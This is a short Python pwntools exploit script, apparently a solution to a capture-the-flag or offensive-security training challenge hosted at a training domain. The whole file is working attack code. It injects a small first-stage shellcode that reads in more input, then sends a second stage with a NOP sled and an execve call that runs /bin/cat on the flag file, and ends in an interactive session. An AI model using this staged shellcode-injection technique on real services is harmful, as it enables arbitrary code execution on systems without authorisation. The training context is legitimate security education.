
from pwn import *
context.clear(arch='amd64',os='linux')

run_local = False
if run_local:
	s = ssh(host='localhost',user='acidburn',port=2222)
	r= s.process('/home/acidburn/Desktop/malicious/shell/6/tiny')
	#pid=gdb.attach(r,"""b *0x555555554d0e""")
	#input("wait")
else:
	r=remote("bin.training.offdef.it",4101)

shellcode=b"\x6A\x00\x58\x6A\x00\x5F\x52\x5E\x68\xFF\x00\x00\x00\x5A\x0F\x05"
r.send(shellcode)
input("wait")

shellcode=b"\x90"*18
shellcode+=asm(shellcraft.execve(path="/bin/cat",argv=["/bin/cat","flag"]))

r.send(shellcode)
r.interactive()
